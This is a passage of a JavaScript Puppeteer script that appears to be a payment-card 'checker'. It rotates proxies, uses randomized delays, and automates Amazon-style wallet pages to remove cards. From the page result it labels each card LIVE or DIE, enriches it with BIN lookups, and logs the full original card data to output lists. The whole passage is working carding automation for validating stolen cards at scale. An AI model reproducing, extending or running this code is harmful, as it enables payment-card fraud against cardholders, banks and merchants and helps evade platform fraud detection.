                };
            });

            let fourNum = cardInfo.number.split('•••• ')[1];

            if (!global.temp.checkCard[index][fourNum]) {
                indexCard++;
                continue;
            }

            let cardBin = await getCardInfo(global.temp.checkCard[index][fourNum].card.number);
            if (!cardBin.success) {
                // Sử dụng giá trị mặc định
                cardBin = {
                    success: true,
                    scheme: 'Unknown',
                    type: 'Unknown',
                    cardTier: 'Unknown',
                    a2: 'Unknown',
                    country: 'Unknown',
                    issuer: 'Unknown'
                };
            }

            const storedImg = global.temp.checkCard[index][fourNum].img || '';
            const currentImg = cardInfo.link || '';
            const currentName = cardInfo.name || '';

            const cardRemoved = await removeCard(page);
            while (cardRemoved.reload) {
                await page.reload({ waitUntil: ["networkidle0", "domcontentloaded"] });
                await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
                cardRemoved = await removeCard(page);
            }
            if (!cardRemoved.success) {
                indexCard++;
                continue;
            }

            saveRemainingCards();

            // ✅ THAY ĐỔI OUTPUT - LẤY TOÀN BỘ DỮ LIỆU GỐC
            const originalData = global.temp.checkCard[index][fourNum].originalData;
            const bankInfo = `|- Info Bank: ${cardBin.scheme}|${cardBin.type}|${cardBin.cardTier}|${cardBin.a2}|${cardBin.country}|${cardBin.issuer}`;
            
            if (storedImg != currentImg || currentName != global.temp.checkCard[index][fourNum].name) {
                console.card.live(`LIVE|${originalData}${bankInfo}`);
                console.log(`✅ LIVE - Card ***${fourNum}`);
                console.app(`✅ LIVE - Card ***${fourNum}`);
            } else {
                console.card.die(`DIE|${originalData}${bankInfo}`);
                console.log(`❌ DIE - Card ***${fourNum}`);
                console.app(`❌ DIE - Card ***${fourNum}`);
            }
        }
        
        return thread(page, browser, email, index, proxy);
    } catch (error) {
        console.log(`❌ Wallet check error: ${email}`);
        console.app(`❌ Wallet check error: ${email}`);
        return thread(page, browser, email, index, proxy);
    }
}

async function removeCard(page) {
    try {
        if (!page || page.isClosed()) {
       
            return {success: false};
        }

        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
        const removeLinkExists = await page.evaluate(() => {
            return !!document.querySelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-link-normal');
        });
        
        if (!removeLinkExists) {
        
            return {success: false, reload: true};
        }
        
        await page.waitForSelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-link-normal', {timeout: 10000});
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
        await page.click('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-link-normal');

        const removeButtonExists = await page.waitForSelector('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper .apx-remove-link-button', {timeout: 10000})
            .then(() => true)
            .catch(() => false);
            
        if (!removeButtonExists) {
      
            return {success: false};
        }
        
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
        await page.click('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper .apx-remove-link-button');

        await page.waitForSelector('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .apx-remove-link-button[value="Remove without selecting"]', {timeout: 3000})
            .then(() => true)
            .catch(() => false);
        let defaultElement = await page.evaluate(() => {
            const element = document.querySelector('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .apx-remove-link-button[value="Remove without selecting"]');
            if (element) {
                element.click();
                return true;
            }
            return false;
        });
        if (defaultElement) {
            return {success: true};
        }

        const confirmButtonExists = await page.waitForSelector('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper span.a-button.a-button-primary.pmts-delete-instrument.apx-remove-button-desktop.pmts-button-input input.a-button-input', {timeout: 10000})
            .then(() => true)
            .catch(() => false);
            
        if (!confirmButtonExists) {
      
            return {success: false};
        }
        
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
        await page.click('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper span.a-button.a-button-primary.pmts-delete-instrument.apx-remove-button-desktop.pmts-button-input input.a-button-input');

        await new Promise(resolve => setTimeout(resolve, randomInt(2000, 3000)));
        return {success: true};
    } catch (error) {
  
        return {success: false};
    }
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function getCardInfo(cardNumber) {
    try {
        const bin = cardNumber.substring(0, 8);
        const binKey = bin.substring(0, 6);
        
        if (binCache[binKey]) {
            
            return {
                success: true,
                scheme: binCache[binKey].scheme,
                type: binCache[binKey].type,
                cardTier: binCache[binKey].cardTier,
                a2: binCache[binKey].a2,
                country: binCache[binKey].country,
                issuer: binCache[binKey].issuer
            };
        }
        
        let res = (await axios.get(`https://data.handyapi.com/bin/${cardNumber}`)).data;
        
        if (res.Status === "SUCCESS") {
            binCache[binKey] = {
                scheme: res.Scheme,
                type: res.Type,
                cardTier: res.CardTier,
                a2: res.Country.A2,
                country: res.Country.Name,
                issuer: res.Issuer
            };
            
            return {
                success: true,
                ...binCache[binKey]
            };
        }
        
        return { success: false, error: res.Status };
    } catch (error) {
        if (error.message && error.message.includes('redirects exceeded')) {
       
        } else {
           
        }
        
        return { 
            success: false, 
            error: error.message,
            scheme: 'Unknown',
            type: 'Unknown',
            cardTier: 'Unknown',
            a2: 'Unknown',
            country: 'Unknown',
            issuer: 'Unknown'
        };
    }
}

var saveData = setInterval(() => {
    fs.writeFileSync(path.join(__dirname, "..", "data", 'data.json'), JSON.stringify(data, null, 2), 'utf8');
}, 5000);

function saveRemainingCards() {
    const remainingCards = listCards.slice(indexCard + 1);
    
    // ✅ ENSURE global.data.dirSave EXISTS
    if (!global.data.dirSave) {
        global.data.dirSave = path.join(__dirname, "..", "data");
    }
    
    fs.writeFileSync(path.join(global.data.dirSave, 'remaining_cards.txt'), remainingCards.join('\n'), 'utf8');
    
    updateRemainingCardCount();
}

function updateRemainingCardCount() {
    const remaining = Math.max(0, totalCards - (indexCard + 1));
    
    if (console.card && typeof console.card.setRemaining === 'function') {
        console.card.setRemaining(remaining);
    }
    
    return remaining;
}


async function checkCard() {
    !data.childCount ? data.childCount = {} : "";
    !global.temp ? global.temp = {} : "";
    !global.temp.checkCard ? global.temp.checkCard = {} : "";
    
    // ✅ RESET WINDOW POSITIONS AT START
    windowManager.reset();
    
    console.app(`🚀 Starting card check with ${totalCards} cards`);
    
    for (let i in listProxy) {
        let [host, port, user, pass] = listProxy[i].split(':');
        let proxy = {
            host: host,
            port: port,
            user: user,
            pass: pass
        };
        initThread(proxy, i);
    }
}


module.exports = checkCard;